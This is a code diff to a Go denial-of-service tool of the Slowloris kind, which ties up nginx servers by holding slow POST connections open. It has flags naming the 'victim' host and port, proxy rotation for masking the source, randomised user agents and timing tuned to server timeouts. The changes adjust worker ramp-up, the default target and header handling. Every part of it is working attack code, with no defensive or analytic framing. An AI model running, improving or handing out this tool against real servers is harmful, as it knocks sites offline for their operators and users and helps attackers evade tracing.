@@ -10,7 +10,6 @@ import (
 	"log"
 	"math/rand"
 	"net"
-	"net/url"
 	"os"
 	"runtime"
 	"time"
@@ -18,11 +17,12 @@ import (
 
 var (
 	contentLength     = flag.Int("contentLength", 1000*1000, "The maximum length of fake POST body in bytes. Adjust to nginx client_max_body_size")
-	sockets           = flag.Int("sockets", 50, "The number of workers simultaneously busy with opening new TCP connections")
+	sockets           = flag.Int("sockets", 1, "The number of workers simultaneously busy with opening new TCP connections")
 	sleepInterval     = flag.Duration("sleepInterval", 10*time.Second, "Sleep interval between subsequent packets sending. Adjust to nginx client_body_timeout")
+	rampUp            = flag.Duration("ramUp", 10*time.Second, "Ramp up seconds")
 	https             = flag.Bool("https", false, "Whether to use tls or not")
 	randUserAgent     = flag.Bool("randUserAgent", false, "Randomizes user-agents with each request")
-	destinationHost   = flag.String("destinationHost", "www.google.com", "Victim's url. Http POST must be allowed in nginx config for this url")
+	destinationHost   = flag.String("destinationHost", "", "Victim's url. Http POST must be allowed in nginx config for this url")
 	destinationPort   = flag.String("destinationPort", "80", "Victim's port.")
 	hostHeader        = flag.String("hostHeader", *destinationHost, "Host header value in case it is different than the hostname in victimUrl")
 	proxyList         = flag.String("proxyList", "", "SOCKS5 proxy port")
@@ -73,19 +73,19 @@ func main() {
 		fmt.Printf("%s=%v\n", f.Name, f.Value)
 	})
 
-	destinationHostPort := net.JoinHostPort("//" + *destinationHost, *destinationPort)
-	destinationUri, err := url.Parse(destinationHostPort)
-	if err != nil {
-		log.Fatalf("Cannot parse destinationUrl=[%s]: [%s]\n", destinationHostPort, err)
-	}
+	destinationHostPort := net.JoinHostPort(*destinationHost, *destinationPort)
 
 	proxyList := generateProxyList(*proxyList)
-	for i:= 0 ; i < *sockets ; i++ {
+	for i:= 1 ; i <= *sockets ; i++ {
 		proxyHostPort := ""
 		if len(proxyList) != 0 {
 			proxyHostPort = proxyList[rand.Intn(len(proxyList))]
 		}
-		go dialWorker(destinationHostPort, proxyHostPort, generateRequestHeader(destinationUri.RequestURI()))
+		requestHeader := generateRequestHeader(destinationHostPort)
+
+		go dialWorker(destinationHostPort, proxyHostPort, requestHeader)
+		log.Printf("Worker: [%d] started. RequestHeader: [%s]", i, requestHeader)
+		time.Sleep(*rampUp)
 	}
 	select {}
 }
@@ -94,6 +94,9 @@ func generateRequestHeader(uri string) []byte  {
 	userAgent := ""
 	if *randUserAgent {
 		userAgent = "\nUser-Agent: " + userAgents[rand.Intn(len(userAgents))]
+	}
+	if len(*hostHeader) == 0 {
+		*hostHeader = uri
 	}
 	return []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s%s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n", uri, *hostHeader, userAgent, *contentLength))
 }
@@ -112,11 +115,7 @@ func generateProxyList(path string) (lines []string) {
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		proxyHostPort := scanner.Text()
-		proxyUri, err := url.Parse(proxyHostPort)
-		if err != nil {
-			log.Fatalf("Cannot parse proxyUrl=[%s]: [%s]\n", proxyHostPort, err)
-		}
-		lines = append(lines, proxyUri.RequestURI())
+		lines = append(lines, proxyHostPort)
 	}
 	return
 
@@ -176,7 +175,6 @@ func dialDestination(destinationHostPort, proxyHostPort string) io.ReadWriteClos
 
 func doLoris(conn io.ReadWriteCloser, requestHeader []byte) {
 	defer conn.Close()
-	log.Printf("RequestHeader: [%s]\n", requestHeader)
 
 	if _, err := conn.Write(requestHeader); err != nil {
 		log.Printf("Cannot write requestHeader=[%v]: [%s]\n", requestHeader, err)
